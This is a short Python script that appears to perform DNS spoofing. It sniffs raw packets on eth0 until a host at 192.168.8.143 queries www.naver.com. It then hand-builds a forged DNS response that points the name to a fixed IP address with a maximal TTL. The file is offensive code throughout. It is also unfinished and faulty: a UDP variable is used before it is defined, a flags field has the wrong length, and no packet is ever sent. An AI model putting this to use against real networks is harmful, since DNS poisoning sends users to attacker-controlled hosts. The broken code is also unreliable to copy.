import socket
import struct
from new_packet_sniffer import Ethernet
from new_packet_sniffer import ARP
from new_packet_sniffer import IP
from new_packet_sniffer import ICMP
from new_packet_sniffer import Echo
from new_packet_sniffer import UDP
from new_packet_sniffer import TCP
from new_packet_sniffer import Packet
from new_packet_sniffer import DNS

raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
raw.bind(('eth0',0))

while True:
  data = raw.recv(65535)
  packet = Packet(data)
  if packet.eth.type == 0x0800 and packet.ip.protocol == 17 and ( packet.ip.dstIp == '192.168.8.143' or packet.ip.srcIp == '192.168.8.143' ) and ( packet.udp.dst_port == 53 ):
    dns = DNS(data[42:])
    if dns.query_name == "www.naver.com" :
      break
# query feild
dns = dns.identification + b'\x8000' + b'\x00\x01' + b'\x00\x01' + b'\x00\x00' + b'\x00\x00'
dns += b'\x03www\x05naver\x03com\x00'
dns += b'\x00\x01'
dns += b'\x00\x01'
# answer feild
dns += b'\xc0\x0c'
dns += b'\x00\x01'
dns += b'\x00\x01'
dns += b'\xff\xff\xff\xff'
dns += b'\x00\x04'
dns += b'\xc0\xab\x08\xca'
# udp header
udp += packet.udp._dst_port
udp += packet.udp._src_port
udp += dns
